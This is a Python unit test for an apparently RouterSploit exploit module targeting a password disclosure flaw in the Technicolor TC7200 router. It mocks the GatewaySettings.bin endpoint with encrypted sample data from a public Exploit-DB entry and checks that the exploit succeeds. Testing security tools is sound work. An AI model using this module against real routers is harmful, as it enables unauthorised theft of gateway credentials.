import binascii
from routersploit.modules.exploits.routers.technicolor.tc7200_password_disclosure_v2 import Exploit


def test_check_success(target):
    """ Test scenario - successful exploitation """

    encrypted_mock = binascii.unhexlify(
        "F29000B62A499FD0A9F39A6ADD2E7780"  # encrypted zero block + data from https://www.exploit-db.com/exploits/31894/
        "c07fdfca294e1a4e4b74dbb2ffb7d2a73a90f00111134dc8d9810a90f2a9bf5862a179a20a9418a486bd4c8170730c8f"
    )

    route_mock = target.get_route_mock("/goform/system/GatewaySettings.bin", methods=["GET"])
    route_mock.return_value = (
        encrypted_mock
    )

    exploit = Exploit()

    assert exploit.target == ""
    assert exploit.port == 80

    exploit.target = target.host
    exploit.port = target.port

    assert exploit.check()
    assert exploit.run() is None
